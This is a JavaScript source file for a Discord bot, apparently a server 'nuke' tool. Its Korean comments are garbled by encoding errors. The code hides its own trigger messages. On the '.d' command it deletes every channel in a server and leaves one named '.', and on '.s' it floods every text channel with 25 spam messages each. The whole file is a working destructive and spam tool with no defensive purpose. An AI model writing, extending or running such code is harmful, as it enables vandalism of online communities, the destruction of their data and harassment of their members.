const fs = require('fs');
const { Client, GatewayIntentBits, ActivityType } = require('discord.js');

// `token.txt` ���Ͽ��� ��ū �б�
const token = fs.readFileSync('token.txt', 'utf8').trim();
const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

client.once('ready', () => {
    console.log('Bot is online!');
    client.user.setActivity(config.botStatus, { type: ActivityType.Playing });
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    // .���� �����ϴ� �޽����� 0.2�� �Ŀ� ����
    if (message.content.startsWith('.')) {
        setTimeout(() => message.delete(), 200);
    }

    // .d ��ɾ�: ��� ä�� ���� �� "." ä�� ����
    if (message.content === '.d') {
        const channels = await message.guild.channels.fetch();
        for (const [id, channel] of channels) {
            await channel.delete();
        }
        setTimeout(async () => {
            await message.guild.channels.create({ name: '.' });
        }, 5000);
    }

    // .s ��ɾ�: ��� ä�ο� 25�� �޽��� ����
    if (message.content === '.s') {
        const channels = await message.guild.channels.fetch();
        for (const [id, channel] of channels) {
            if (channel.isTextBased()) {
                for (let i = 0; i < 25; i++) {
                    await channel.send(config.spamMessage);
                }
            }
        }
    }

    // .help ��ɾ�: ���� ��ɾ� ����� ���� �޽����� ����
    if (message.content === '.help') {
        const helpMessage = `
        Available commands:
        1. .d - Delete all channels and create "." channel
        2. .s - Send 25 messages to all channels
        3. .help - Send this help message
        `;
        await message.author.send(helpMessage);
    }
});

// �� �α���
client.login(token);
